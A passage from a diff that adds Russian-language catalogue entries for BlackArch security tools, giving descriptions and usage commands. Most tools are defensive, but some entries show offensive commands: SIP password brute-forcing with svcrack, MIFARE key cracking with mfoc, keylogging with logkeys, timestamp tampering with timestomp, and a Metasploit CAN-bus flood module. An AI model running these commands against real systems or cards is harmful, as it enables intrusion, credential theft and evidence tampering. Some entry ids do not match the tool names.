+      {"flag": "-v", "description": "Подробный вывод пакетов"},
+      {"flag": "-i", "description": "Сетевой интерфейс"},
+      {"flag": "-c", "description": "Файл конфигурации"},
+      {"flag": "-r", "description": "Чтение из pcap"},
+      {"flag": "-A", "description": "Режим алертов (fast, full, console, none)"},
+      {"flag": "-l", "description": "Директория для логов"}
+    ]
+  },
+  {
+    "id": "suricata",
+    "name": "Suricata",
+    "version": "7.0.3",
+    "categories": ["blackarch-ids", "blackarch-defensive", "blackarch-sniffer"],
+    "description": "High performance Network IDS, IPS and Network Security Monitoring engine",
+    "descriptionRu": "Высокопроизводительная система IDS/IPS и мониторинга сетевой безопасности",
+    "helpRu": "Suricata — высокопроизводительный движок для обнаружения вторжений, предотвращения и мониторинга сети.\n\nОсновные возможности:\n- Многопоточность\n- Совместимость с правилами Snort\n- Протокольная идентификация\n- Извлечение файлов\n- EVE JSON логирование\n- Lua-скрипты\n- TLS/SSL инспекция",
+    "url": "https://suricata.io/",
+    "command": "suricata",
+    "usageExamples": [
+      {"title": "IDS режим", "command": "suricata -c /etc/suricata/suricata.yaml -i eth0", "description": "Запуск в режиме IDS на интерфейсе"},
+      {"title": "Анализ pcap", "command": "suricata -r capture.pcap -c /etc/suricata/suricata.yaml", "description": "Анализ pcap-файла"}
+    ],
+    "parameters": [
+      {"flag": "-c", "description": "Файл конфигурации"},
+      {"flag": "-i", "description": "Сетевой интерфейс"},
+      {"flag": "-r", "description": "Чтение из pcap"},
+      {"flag": "-s", "description": "Файл правил"},
+      {"flag": "--af-packet", "description": "Использовать AF_PACKET"}
+    ]
+  },
+  {
+    "id": "cowrie",
+    "name": "Cowrie",
+    "version": "2.5.0",
+    "categories": ["blackarch-honeypot", "blackarch-defensive"],
+    "description": "Medium to high interaction SSH and Telnet honeypot",
+    "descriptionRu": "SSH/Telnet-ханипот средней и высокой интерактивности для обнаружения и анализа атак",
+    "helpRu": "Cowrie — SSH и Telnet ханипот для логирования brute-force атак и shell-взаимодействия злоумышленников.\n\nОсновные возможности:\n- Эмуляция файловой системы\n- Логирование всех команд\n- Запись сессий для воспроизведения\n- Загрузка файлов злоумышленником\n- JSON логирование\n- Интеграция с ELK Stack",
+    "url": "https://github.com/cowrie/cowrie",
+    "command": "cowrie",
+    "usageExamples": [
+      {"title": "Запуск ханипота", "command": "cowrie start", "description": "Запустить Cowrie SSH-ханипот"},
+      {"title": "Остановка", "command": "cowrie stop", "description": "Остановить ханипот"}
+    ],
+    "parameters": [
+      {"flag": "start", "description": "Запустить ханипот"},
+      {"flag": "stop", "description": "Остановить ханипот"},
+      {"flag": "status", "description": "Статус ханипота"}
+    ]
+  },
+  {
+    "id": "kippo",
+    "name": "HoneyDB",
+    "version": "1.0",
+    "categories": ["blackarch-honeypot", "blackarch-defensive"],
+    "description": "Multi-service honeypot with web-based management",
+    "descriptionRu": "Многосервисный ханипот для обнаружения сканирования и атак на различные сетевые службы",
+    "helpRu": "HoneyDB — агент-ханипот, эмулирующий множество сетевых служб для обнаружения разведки и атак.\n\nОсновные возможности:\n- Эмуляция множества сетевых служб\n- Веб-панель управления\n- API для интеграции\n- Статистика атак\n- Интеграция с threat intelligence",
+    "url": "https://honeydb.io/",
+    "command": "honeydb-agent",
+    "usageExamples": [
+      {"title": "Запуск агента", "command": "honeydb-agent -c config.json", "description": "Запустить HoneyDB агент с конфигурацией"}
+    ],
+    "parameters": [
+      {"flag": "-c", "description": "Файл конфигурации"}
+    ]
+  },
+  {
+    "id": "ubertooth",
+    "name": "Ubertooth",
+    "version": "2020.12.R1",
+    "categories": ["blackarch-bluetooth", "blackarch-wireless"],
+    "description": "Bluetooth monitoring tool for Ubertooth hardware",
+    "descriptionRu": "Инструменты для мониторинга и анализа Bluetooth-трафика с использованием Ubertooth",
+    "helpRu": "Ubertooth — набор инструментов для мониторинга Bluetooth (BLE и Classic) с аппаратным адаптером Ubertooth One.\n\nОсновные возможности:\n- Пассивный мониторинг Bluetooth\n- Захват BLE advertising пакетов\n- Спектральный анализ 2.4 GHz\n- Обнаружение Bluetooth-устройств\n- Интеграция с Wireshark",
+    "url": "https://github.com/greatscottgadgets/ubertooth",
+    "command": "ubertooth-scan",
+    "usageExamples": [
+      {"title": "Сканирование BLE", "command": "ubertooth-btle -f", "description": "Захват BLE advertising пакетов"},
+      {"title": "Спектральный анализ", "command": "ubertooth-specan", "description": "Спектральный анализ 2.4 GHz диапазона"}
+    ],
+    "parameters": [
+      {"flag": "-f", "description": "Следить за BLE advertising"},
+      {"flag": "-t", "description": "Целевой MAC-адрес"},
+      {"flag": "-U", "description": "Номер устройства Ubertooth"}
+    ]
+  },
+  {
+    "id": "bluehydra",
+    "name": "Blue Hydra",
+    "version": "1.0",
+    "categories": ["blackarch-bluetooth", "blackarch-wireless", "blackarch-recon"],
+    "description": "Bluetooth device discovery and tracking",
+    "descriptionRu": "Обнаружение и отслеживание Bluetooth-устройств (Classic и BLE)",
+    "helpRu": "Blue Hydra — инструмент для обнаружения Bluetooth Classic и BLE устройств.\n\nОсновные возможности:\n- Обнаружение Bluetooth Classic и BLE\n- Отслеживание устройств\n- SQLite БД для хранения\n- Веб-интерфейс\n- Интеграция с Ubertooth",
+    "url": "https://github.com/pwnieexpress/blue_hydra",
+    "command": "blue_hydra",
+    "usageExamples": [
+      {"title": "Запуск обнаружения", "command": "blue_hydra", "description": "Начать обнаружение Bluetooth-устройств"}
+    ],
+    "parameters": [
+      {"flag": "--daemon", "description": "Фоновый режим"},
+      {"flag": "--no-pulse", "description": "Без отправки данных Pulse"}
+    ]
+  },
+  {
+    "id": "libnfc",
+    "name": "libnfc / nfc-tools",
+    "version": "1.8.0",
+    "categories": ["blackarch-nfc", "blackarch-hardware"],
+    "description": "NFC library and tools for reading/writing NFC tags",
+    "descriptionRu": "Библиотека и инструменты для чтения, записи и эмуляции NFC-тегов и RFID-карт",
+    "helpRu": "libnfc — библиотека и набор утилит для работы с NFC (Near Field Communication) устройствами.\n\nОсновные возможности:\n- Чтение/запись NFC-тегов\n- Поддержка MIFARE Classic, Ultralight, DESFire\n- Эмуляция тегов\n- Работа с ACR122U и другими NFC-ридерами\n- Дамп карт",
+    "url": "https://github.com/nfc-tools/libnfc",
+    "command": "nfc-list",
+    "usageExamples": [
+      {"title": "Список NFC устройств", "command": "nfc-list", "description": "Показать подключённые NFC-ридеры и обнаруженные теги"},
+      {"title": "Дамп MIFARE Classic", "command": "nfc-mfclassic r a dump.mfd", "description": "Прочитать MIFARE Classic карту"},
+      {"title": "Запись MIFARE", "command": "nfc-mfclassic w a dump.mfd", "description": "Записать дамп обратно на карту"}
+    ],
+    "parameters": [
+      {"flag": "nfc-list", "description": "Список NFC-устройств"},
+      {"flag": "nfc-mfclassic", "description": "Работа с MIFARE Classic (r=read, w=write)"},
+      {"flag": "nfc-mfultralight", "description": "Работа с MIFARE Ultralight"}
+    ]
+  },
+  {
+    "id": "mfoc",
+    "name": "MFOC",
+    "version": "0.10.7",
+    "categories": ["blackarch-nfc", "blackarch-cracker"],
+    "description": "MIFARE Classic offline cracker",
+    "descriptionRu": "Инструмент для взлома ключей MIFARE Classic карт методом вложенной атаки",
+    "helpRu": "MFOC — инструмент для взлома ключей MIFARE Classic NFC-карт.\n\nОсновные возможности:\n- Nested attack на MIFARE Classic\n- Требуется хотя бы один известный ключ\n- Дамп полного содержимого карты\n- Поддержка 1K и 4K карт",
+    "url": "https://github.com/nfc-tools/mfoc",
+    "command": "mfoc",
+    "usageExamples": [
+      {"title": "Взлом ключей и дамп", "command": "mfoc -O card_dump.mfd", "description": "Взломать все ключи и сохранить дамп карты"}
+    ],
+    "parameters": [
+      {"flag": "-O", "description": "Выходной файл для дампа"},
+      {"flag": "-k", "description": "Указать известный ключ"},
+      {"flag": "-P", "description": "Количество попыток на сектор"}
+    ]
+  },
+  {
+    "id": "sipvicious",
+    "name": "SIPVicious",
+    "version": "0.3.4",
+    "categories": ["blackarch-voip", "blackarch-scanner"],
+    "description": "SIP protocol auditing toolkit",
+    "descriptionRu": "Набор инструментов для аудита SIP-протокола — обнаружение, перечисление, взлом VoIP",
+    "helpRu": "SIPVicious — набор утилит для аудита VoIP-систем на базе SIP.\n\nОсновные возможности:\n- svmap: обнаружение SIP-устройств\n- svwar: перечисление SIP-расширений (extensions)\n- svcrack: взлом паролей SIP-аккаунтов\n- svreport: генерация отчётов",
+    "url": "https://github.com/EnableSecurity/sipvicious",
+    "command": "svmap",
+    "usageExamples": [
+      {"title": "Обнаружение SIP", "command": "svmap 192.168.1.0/24", "description": "Найти SIP-устройства в подсети"},
+      {"title": "Перечисление расширений", "command": "svwar -m INVITE 192.168.1.1 -e 100-999", "description": "Найти активные SIP-расширения"},
+      {"title": "Brute-force пароля", "command": "svcrack -u 100 -d wordlist.txt 192.168.1.1", "description": "Подбор пароля для SIP-расширения 100"}
+    ],
+    "parameters": [
+      {"flag": "svmap", "description": "Обнаружение SIP-устройств"},
+      {"flag": "svwar", "description": "Перечисление расширений"},
+      {"flag": "svcrack", "description": "Brute-force паролей"},
+      {"flag": "-m", "description": "Метод SIP (INVITE, REGISTER, OPTIONS)"},
+      {"flag": "-e", "description": "Диапазон расширений"},
+      {"flag": "-d", "description": "Словарь для brute-force"}
+    ]
+  },
+  {
+    "id": "logkeysh",
+    "name": "logkeys",
+    "version": "0.2.0",
+    "categories": ["blackarch-keylogger"],
+    "description": "Linux keylogger that works with the input event subsystem",
+    "descriptionRu": "Linux-кейлоггер, работающий через подсистему input events ядра",
+    "helpRu": "logkeys — простой кейлоггер для Linux, работающий через /dev/input/ event-интерфейс.\n\nОсновные возможности:\n- Захват нажатий клавиш\n- Работа через input events ядра\n- Поддержка различных раскладок\n- Логирование в файл",
+    "url": "https://github.com/kernc/logkeys",
+    "command": "logkeys",
+    "usageExamples": [
+      {"title": "Запуск кейлоггера", "command": "logkeys --start --output /tmp/keys.log", "description": "Начать запись нажатий клавиш"},
+      {"title": "Остановка", "command": "logkeys --kill", "description": "Остановить запись"}
+    ],
+    "parameters": [
+      {"flag": "--start", "description": "Запустить логирование"},
+      {"flag": "--kill", "description": "Остановить логирование"},
+      {"flag": "--output", "description": "Файл для записи"},
+      {"flag": "--device", "description": "Указать input-устройство"}
+    ]
+  },
+  {
+    "id": "upx",
+    "name": "UPX",
+    "version": "4.2.2",
+    "categories": ["blackarch-packer", "blackarch-binary"],
+    "description": "Ultimate Packer for eXecutables — compress and decompress executables",
+    "descriptionRu": "Универсальный упаковщик исполняемых файлов — сжатие ELF, PE, Mach-O",
+    "helpRu": "UPX (Ultimate Packer for eXecutables) — упаковщик исполняемых файлов.\n\nОсновные возможности:\n- Сжатие ELF, PE, Mach-O бинарников\n- Уменьшение размера до 50-70%\n- Автоматическая распаковка при запуске\n- Многоплатформенность",
+    "url": "https://upx.github.io/",
+    "command": "upx",
+    "usageExamples": [
+      {"title": "Упаковать файл", "command": "upx -9 binary", "description": "Максимальное сжатие бинарного файла"},
+      {"title": "Распаковать", "command": "upx -d packed_binary", "description": "Распаковать файл, упакованный UPX"},
+      {"title": "Информация", "command": "upx -l binary", "description": "Показать информацию об упаковке"}
+    ],
+    "parameters": [
+      {"flag": "-1...-9", "description": "Уровень сжатия (1=быстро, 9=максимум)"},
+      {"flag": "-d", "description": "Распаковать"},
+      {"flag": "-l", "description": "Информация об упаковке"},
+      {"flag": "-t", "description": "Тестировать упакованный файл"},
+      {"flag": "--brute", "description": "Максимальная компрессия (медленно)"}
+    ]
+  },
+  {
+    "id": "themida-unpack",
+    "name": "de4dot",
+    "version": "3.1.41592",
+    "categories": ["blackarch-unpacker", "blackarch-reversing"],
+    "description": ".NET deobfuscator and unpacker",
+    "descriptionRu": "Деобфускатор и распаковщик .NET-приложений — снятие защиты и восстановление кода",
+    "helpRu": "de4dot — деобфускатор для .NET-приложений. Снимает обфускацию, примённую различными протекторами.\n\nПоддерживаемые обфускаторы:\n- Dotfuscator\n- Eazfuscator.NET\n- ConfuserEx\n- SmartAssembly\n- .NET Reactor\n- Agile.NET\n- Babel.NET\n- и многие другие",
+    "url": "https://github.com/de4dot/de4dot",
+    "command": "de4dot",
+    "usageExamples": [
+      {"title": "Деобфускация", "command": "de4dot obfuscated.exe", "description": "Снять обфускацию с .NET-приложения"},
+      {"title": "Указать обфускатор", "command": "de4dot obfuscated.exe -p dr", "description": "Указать тип обфускатора (.NET Reactor)"}
+    ],
+    "parameters": [
+      {"flag": "-p", "description": "Указать обфускатор (un=unknown, sa=SmartAssembly, dr=.NET Reactor)"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "-r", "description": "Рекурсивная обработка директории"}
+    ]
+  },
+  {
+    "id": "unipacker",
+    "name": "UniPacker",
+    "version": "1.0",
+    "categories": ["blackarch-unpacker", "blackarch-malware"],
+    "description": "Automatic and platform-independent unpacker for Windows malware",
+    "descriptionRu": "Автоматический кроссплатформенный распаковщик вредоносного ПО для Windows",
+    "helpRu": "UniPacker — автоматический распаковщик Windows PE-файлов, упакованных различными пакерами.\n\nОсновные возможности:\n- Автоматическое определение пакера\n- Эмуляция через Unicorn engine\n- Не требует Windows\n- Поддержка UPX, ASPack, PEtite, FSG, и др.",
+    "url": "https://github.com/unipacker/unipacker",
+    "command": "unipacker",
+    "usageExamples": [
+      {"title": "Распаковка", "command": "unipacker packed.exe", "description": "Автоматическая распаковка PE-файла"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "shred",
+    "name": "shred / secure-delete",
+    "version": "4.1",
+    "categories": ["blackarch-anti-forensic"],
+    "description": "Securely delete files, directories, swap and memory",
+    "descriptionRu": "Безопасное уничтожение файлов, директорий, swap и памяти с многократной перезаписью",
+    "helpRu": "secure-delete — набор утилит для безопасного уничтожения данных.\n\nУтилиты:\n- srm: безопасное удаление файлов\n- sfill: очистка свободного пространства диска\n- sswap: очистка swap-раздела\n- smem: очистка оперативной памяти\n\nИспользует алгоритм Гутмана (35 проходов перезаписи).",
+    "url": "https://sourceforge.net/projects/srm/",
+    "command": "srm",
+    "usageExamples": [
+      {"title": "Удаление файла", "command": "srm -v secret.txt", "description": "Безопасное удаление файла (35 проходов)"},
+      {"title": "Быстрое удаление", "command": "srm -sz secret.txt", "description": "Быстрое удаление (1 проход нулями)"},
+      {"title": "Очистка свободного места", "command": "sfill -v /home/", "description": "Перезаписать свободное пространство на разделе"},
+      {"title": "Очистка RAM", "command": "smem -f", "description": "Очистить свободную оперативную память"}
+    ],
+    "parameters": [
+      {"flag": "-v", "description": "Подробный вывод"},
+      {"flag": "-z", "description": "Финальная перезапись нулями"},
+      {"flag": "-s", "description": "Быстрый режим (без DOD 5220.22-M)"},
+      {"flag": "-r", "description": "Рекурсивное удаление директорий"},
+      {"flag": "-f", "description": "Принудительное выполнение"}
+    ]
+  },
+  {
+    "id": "timestomp",
+    "name": "Timestomp (Metasploit)",
+    "version": "6.3",
+    "categories": ["blackarch-anti-forensic", "blackarch-exploitation"],
+    "description": "Modify file timestamps to evade forensic timeline analysis",
+    "descriptionRu": "Модификация временных меток файлов для противодействия форензик-анализу временной шкалы",
+    "helpRu": "Timestomp — инструмент (модуль Metasploit Meterpreter) для модификации MACE-временных меток файлов.\n\nМодифицирует:\n- Modified (изменение)\n- Accessed (доступ)\n- Created (создание)\n- Entry Modified (изменение MFT записи)\n\nИспользуется для противодействия timeline-анализу в цифровой криминалистике.",
+    "url": "https://www.metasploit.com/",
+    "command": "timestomp",
+    "usageExamples": [
+      {"title": "Очистка временных меток", "command": "timestomp C:\\file.txt -b", "description": "Очистить все временные метки (Meterpreter)"},
+      {"title": "Установка даты", "command": "timestomp C:\\file.txt -m '01/01/2020 12:00:00'", "description": "Установить дату модификации"}
+    ],
+    "parameters": [
+      {"flag": "-m", "description": "Дата модификации"},
+      {"flag": "-a", "description": "Дата доступа"},
+      {"flag": "-c", "description": "Дата создания"},
+      {"flag": "-e", "description": "Дата изменения MFT"},
+      {"flag": "-b", "description": "Очистить все метки"}
+    ]
+  },
+  {
+    "id": "threatdragon",
+    "name": "OWASP Threat Dragon",
+    "version": "2.1.1",
+    "categories": ["blackarch-threat-model", "blackarch-defensive"],
+    "description": "Threat modeling tool from OWASP",
+    "descriptionRu": "Инструмент моделирования угроз от OWASP — визуальное создание диаграмм и анализ рисков",
+    "helpRu": "OWASP Threat Dragon — инструмент моделирования угроз с графическим интерфейсом.\n\nОсновные возможности:\n- Создание диаграмм потоков данных (DFD)\n- STRIDE моделирование угроз\n- Визуальный редактор\n- Генерация отчётов\n- Десктопная и веб-версия\n- Интеграция с GitHub",
+    "url": "https://owasp.org/www-project-threat-dragon/",
+    "command": "threat-dragon",
+    "usageExamples": [
+      {"title": "Запуск", "command": "threat-dragon", "description": "Открыть графический интерфейс Threat Dragon"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "microsoft-tmt",
+    "name": "Threagile",
+    "version": "1.0",
+    "categories": ["blackarch-threat-model", "blackarch-defensive"],
+    "description": "Agile threat modeling as code",
+    "descriptionRu": "Моделирование угроз как код — YAML-определения архитектуры с автоматическим анализом рисков",
+    "helpRu": "Threagile — инструмент моделирования угроз через код (YAML). Автоматически генерирует модель угроз.\n\nОсновные возможности:\n- Описание архитектуры в YAML\n- Автоматическая генерация рисков\n- Визуализация (диаграммы)\n- Генерация PDF-отчётов\n- Правила STRIDE\n- CI/CD интеграция",
+    "url": "https://github.com/Threagile/threagile",
+    "command": "threagile",
+    "usageExamples": [
+      {"title": "Анализ модели", "command": "threagile -model model.yaml -output output/", "description": "Сгенерировать модель угроз из YAML"},
+      {"title": "Создание шаблона", "command": "threagile -create-example-model", "description": "Создать пример YAML-модели"}
+    ],
+    "parameters": [
+      {"flag": "-model", "description": "Файл модели YAML"},
+      {"flag": "-output", "description": "Директория для отчётов"},
+      {"flag": "-create-example-model", "description": "Создать пример модели"}
+    ]
+  },
+  {
+    "id": "dronesploit",
+    "name": "DroneSploit",
+    "version": "1.2.3",
+    "categories": ["blackarch-drone", "blackarch-wireless"],
+    "description": "Drone pentesting framework based on sploitkit",
+    "descriptionRu": "Фреймворк для тестирования безопасности дронов — перехват управления, деаутентификация",
+    "helpRu": "DroneSploit — фреймворк для пентеста дронов на базе sploitkit.\n\nОсновные возможности:\n- Обнаружение дронов по WiFi\n- Деаутентификация контроллера\n- Перехват видеопотока\n- Атаки на протоколы управления\n- Модульная архитектура",
+    "url": "https://github.com/dhondta/dronesploit",
+    "command": "dronesploit",
+    "usageExamples": [
+      {"title": "Запуск фреймворка", "command": "dronesploit", "description": "Открыть интерактивную консоль DroneSploit"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "gdb",
+    "name": "GDB + GEF",
+    "version": "14.1",
+    "categories": ["blackarch-debugger", "blackarch-binary", "blackarch-reversing"],
+    "description": "GNU Debugger with GEF extension for exploit development",
+    "descriptionRu": "GNU Debugger с расширением GEF для разработки эксплойтов и анализа бинарников",
+    "helpRu": "GDB — стандартный отладчик для Linux. GEF (GDB Enhanced Features) — расширение для exploit development.\n\nОсновные возможности GEF:\n- Красивый вывод регистров, стека, кода\n- Визуализация heap\n- Проверка checksec\n- ROP gadgets search\n- Pattern generation/offset\n- Heap analysis\n- Format string helper",
+    "url": "https://github.com/hugsy/gef",
+    "command": "gdb",
+    "usageExamples": [
+      {"title": "Отладка бинарника", "command": "gdb ./binary", "description": "Открыть бинарник в GDB"},
+      {"title": "Подключение к процессу", "command": "gdb -p 1234", "description": "Подключиться к запущенному процессу"},
+      {"title": "Core dump анализ", "command": "gdb ./binary core", "description": "Анализ core dump файла"}
+    ],
+    "parameters": [
+      {"flag": "-p", "description": "PID процесса для подключения"},
+      {"flag": "-q", "description": "Тихий режим (без баннера)"},
+      {"flag": "-x", "description": "Выполнить команды из файла"},
+      {"flag": "-batch", "description": "Пакетный режим"}
+    ]
+  },
+  {
+    "id": "arpwatch",
+    "name": "arpwatch",
+    "version": "3.4",
+    "categories": ["blackarch-spoof", "blackarch-networking", "blackarch-defensive"],
+    "description": "Ethernet/IP address pairing monitor — detects ARP spoofing",
+    "descriptionRu": "Мониторинг соответствия MAC/IP адресов в сети — обнаружение ARP-спуфинга",
+    "helpRu": "arpwatch — утилита мониторинга ARP-активности в сети. Обнаруживает ARP-спуфинг и изменения MAC-адресов.\n\nОсновные возможности:\n- Мониторинг ARP-пакетов\n- Обнаружение ARP spoofing\n- Уведомления об изменениях MAC/IP\n- База данных MAC/IP соответствий\n- Email-алерты",
+    "url": "https://ee.lbl.gov/",
+    "command": "arpwatch",
+    "usageExamples": [
+      {"title": "Мониторинг интерфейса", "command": "arpwatch -i eth0", "description": "Начать мониторинг ARP на интерфейсе"},
+      {"title": "С логированием", "command": "arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat", "description": "Мониторинг с сохранением в БД"}
+    ],
+    "parameters": [
+      {"flag": "-i", "description": "Сетевой интерфейс"},
+      {"flag": "-f", "description": "Файл базы данных"},
+      {"flag": "-d", "description": "Режим отладки (не уходить в фон)"}
+    ]
+  },
+  {
+    "id": "hashdeep",
+    "name": "hashdeep",
+    "version": "4.4",
+    "categories": ["blackarch-forensic", "blackarch-crypto"],
+    "description": "Compute and audit hashsets of files recursively",
+    "descriptionRu": "Рекурсивное вычисление и аудит хешей файлов — проверка целостности и обнаружение изменений",
+    "helpRu": "hashdeep — инструмент для рекурсивного вычисления хешей файлов и аудита целостности.\n\nОсновные возможности:\n- MD5, SHA-1, SHA-256, Tiger, Whirlpool\n- Рекурсивное хеширование\n- Режим аудита (сравнение с эталоном)\n- Обнаружение новых/удалённых/изменённых файлов\n- Piecewise hashing",
+    "url": "https://github.com/jessek/hashdeep",
+    "command": "hashdeep",
+    "usageExamples": [
+      {"title": "Хеширование директории", "command": "hashdeep -r /evidence/ > hashes.txt", "description": "Рекурсивно вычислить хеши всех файлов"},
+      {"title": "Аудит целостности", "command": "hashdeep -r -a -k hashes.txt /evidence/", "description": "Проверить целостность по эталонным хешам"}
+    ],
+    "parameters": [
+      {"flag": "-r", "description": "Рекурсивно"},
+      {"flag": "-a", "description": "Режим аудита"},
+      {"flag": "-k", "description": "Файл с эталонными хешами"},
+      {"flag": "-c", "description": "Алгоритм хеширования (md5, sha1, sha256)"},
+      {"flag": "-e", "description": "Показать оценку времени"}
+    ]
+  },
+  {
+    "id": "firmwalker",
+    "name": "Firmwalker",
+    "version": "1.0",
+    "categories": ["blackarch-firmware", "blackarch-forensic"],
+    "description": "Script to search extracted firmware file systems for sensitive data",
+    "descriptionRu": "Скрипт для поиска чувствительных данных в извлечённых файловых системах прошивок",
+    "helpRu": "Firmwalker — скрипт для анализа извлечённых файловых систем прошивок (после binwalk).\n\nИщет:\n- Пароли и учётные данные\n- SSL-сертификаты и приватные ключи\n- Конфигурационные файлы\n- Email-адреса и URL\n- IP-адреса\n- Скрипты и бинарники\n- etc/shadow и etc/passwd",
+    "url": "https://github.com/craigz28/firmwalker",
+    "command": "firmwalker",
+    "usageExamples": [
+      {"title": "Анализ прошивки", "command": "firmwalker /path/to/extracted/firmware/", "description": "Поиск чувствительных данных в извлечённой прошивке"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "oclhashcat",
+    "name": "Hashcat (GPU)",
+    "version": "6.2.6",
+    "categories": ["blackarch-gpu", "blackarch-cracker"],
+    "description": "Advanced GPU-based password recovery utility",
+    "descriptionRu": "Использование GPU для ускорения подбора паролей — CUDA и OpenCL вычисления",
+    "helpRu": "Hashcat с GPU — использование видеокарт для массивного ускорения подбора паролей.\n\nОсновные возможности GPU-режима:\n- Поддержка NVIDIA CUDA и AMD OpenCL\n- Скорость миллиарды хешей в секунду\n- Мульти-GPU поддержка\n- Мониторинг температуры\n- Автоматический tuning",
+    "url": "https://hashcat.net/hashcat/",
+    "command": "hashcat",
+    "usageExamples": [
+      {"title": "MD5 на GPU", "command": "hashcat -m 0 -a 0 -d 1 hashes.txt wordlist.txt", "description": "MD5 брутфорс на первом GPU-устройстве"},
+      {"title": "Бенчмарк GPU", "command": "hashcat -b", "description": "Запустить бенчмарк на всех GPU"},
+      {"title": "Показать устройства", "command": "hashcat -I", "description": "Информация об OpenCL/CUDA устройствах"}
+    ],
+    "parameters": [
+      {"flag": "-d", "description": "Указать GPU-устройство"},
+      {"flag": "-w", "description": "Профиль нагрузки (1=низкая, 4=кошмар)"},
+      {"flag": "-b", "description": "Бенчмарк"},
+      {"flag": "-I", "description": "Информация об устройствах"},
+      {"flag": "--gpu-temp-abort", "description": "Макс. температура GPU"},
+      {"flag": "-O", "description": "Оптимизированные ядра (быстрее, но ограничение длины)"}
+    ]
+  },
+  {
+    "id": "hardware-bridge",
+    "name": "Metasploit Hardware Bridge",
+    "version": "6.3",
+    "categories": ["blackarch-hardware", "blackarch-exploitation"],
+    "description": "Hardware testing bridge for Metasploit — automotive, IoT",
+    "descriptionRu": "Мост для тестирования аппаратного обеспечения через Metasploit — автомобили, IoT, промышленные системы",
+    "helpRu": "Metasploit Hardware Bridge — расширение Metasploit для тестирования аппаратных устройств.\n\nОсновные возможности:\n- CAN bus взаимодействие (автомобили)\n- Zigbee анализ (IoT)\n- JTAG отладка\n- SPI/I2C интерфейсы\n- Модульная архитектура",
+    "url": "https://www.metasploit.com/",
+    "command": "msfconsole",
+    "usageExamples": [
+      {"title": "CAN bus модуль", "command": "use post/hardware/automotive/can_flood", "description": "Загрузить модуль CAN bus flood (в Metasploit)"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "buspirate",
+    "name": "Bus Pirate Tools",
+    "version": "7.0",
+    "categories": ["blackarch-hardware", "blackarch-firmware"],
+    "description": "Tools for Bus Pirate hardware hacking device",
+    "descriptionRu": "Инструменты для аппаратного хакерского устройства Bus Pirate — SPI, I2C, UART, JTAG",
+    "helpRu": "Bus Pirate — аппаратное устройство для взаимодействия с различными протоколами.\n\nПоддерживаемые протоколы:\n- SPI\n- I2C\n- UART\n- JTAG\n- 1-Wire\n- Raw bitbang\n\nИспользуется для:\n- Чтения/записи чипов (EEPROM, Flash)\n- Отладки встроенных систем\n- Анализа коммуникаций IoT",
+    "url": "http://dangerousprototypes.com/docs/Bus_Pirate",
+    "command": "buspirate",
+    "usageExamples": [
+      {"title": "Подключение", "command": "screen /dev/ttyUSB0 115200", "description": "Подключиться к Bus Pirate через serial console"}
+    ],
+    "parameters": []
+  },
+  {
+    "id": "semgrep",
+    "name": "Semgrep",
+    "version": "1.60.0",
+    "categories": ["blackarch-code-audit", "blackarch-automation"],
+    "description": "Lightweight static analysis tool for finding bugs and security issues",
+    "descriptionRu": "Лёгкий статический анализатор кода для поиска багов и уязвимостей в 30+ языках",
+    "helpRu": "Semgrep — статический анализатор кода для поиска уязвимостей, багов и антипаттернов.\n\nОсновные возможности:\n- Поддержка 30+ языков\n- Пользовательские правила (YAML)\n- Готовые наборы правил (OWASP, security-audit)\n- CI/CD интеграция\n- Быстрое сканирование\n- Низкий процент ложных срабатываний",
+    "url": "https://semgrep.dev/",
+    "command": "semgrep",
+    "usageExamples": [
+      {"title": "Сканирование проекта", "command": "semgrep --config auto .", "description": "Автоматическое сканирование текущего проекта"},
+      {"title": "Проверка безопасности", "command": "semgrep --config p/security-audit .", "description": "Аудит безопасности кода"},
+      {"title": "OWASP правила", "command": "semgrep --config p/owasp-top-ten .", "description": "Проверка на OWASP Top 10"}
+    ],
+    "parameters": [
+      {"flag": "--config", "description": "Конфигурация правил (auto, p/security-audit, файл)"},
+      {"flag": "-l", "description": "Фильтр по языку"},
+      {"flag": "-o", "description": "Выходной файл"},
+      {"flag": "--json", "description": "Вывод в JSON"},
+      {"flag": "--severity", "description": "Фильтр по серьёзности (INFO, WARNING, ERROR)"}
+    ]
+  },
+  {
+    "id": "ansible-playbook-sec",
+    "name": "Scout Suite",
+    "version": "5.13.0",
+    "categories": ["blackarch-automation", "blackarch-vuln-assessment"],
+    "description": "Multi-cloud security auditing tool",
+    "descriptionRu": "Мультиоблачный инструмент аудита безопасности — AWS, Azure, GCP, Alibaba Cloud",
+    "helpRu": "Scout Suite — инструмент автоматизированного аудита безопасности облачных сред.\n\nПоддерживаемые облака:\n- AWS\n- Azure\n- Google Cloud Platform\n- Alibaba Cloud\n- Oracle Cloud\n\nОсновные возможности:\n- Автоматический сбор конфигурации\n- Проверка на 300+ правил безопасности\n- HTML-отчёт с визуализацией\n- Кастомные правила",
+    "url": "https://github.com/nccgroup/ScoutSuite",
+    "command": "scout",
+    "usageExamples": [
+      {"title": "Аудит AWS", "command": "scout aws --profile my-profile", "description": "Аудит безопасности AWS аккаунта"},
+      {"title": "Аудит Azure", "command": "scout azure --cli", "description": "Аудит Azure через CLI аутентификацию"}
+    ],
+    "parameters": [
+      {"flag": "aws/azure/gcp", "description": "Целевое облако"},
+      {"flag": "--profile", "description": "AWS профиль"},
+      {"flag": "--cli", "description": "Использовать CLI аутентификацию"},
+      {"flag": "--report-dir", "description": "Директория для отчёта"},
+      {"flag": "--ruleset", "description": "Пользовательский набор правил"}
+    ]
+  },
+  {
+    "id": "decompiler-retdec",
+    "name": "RetDec",
+    "version": "5.0",
+    "categories": ["blackarch-decompiler", "blackarch-reversing"],
+    "description": "Retargetable machine-code decompiler based on LLVM",
+    "descriptionRu": "Переносимый декомпилятор машинного кода на основе LLVM — восстановление C-кода из бинарников",
+    "helpRu": "RetDec — декомпилятор от Avast, преобразующий машинный код обратно в C-подобный код.\n\nОсновные возможности:\n- Поддержка x86, ARM, MIPS, PPC, и др.\n- PE, ELF, Mach-O, COFF форматы\n- На основе LLVM\n- Деобфускация\n- Анализ графа вызовов\n- Вывод в C-код",
+    "url": "https://github.com/avast/retdec",
+    "command": "retdec-decompiler",
+    "usageExamples": [
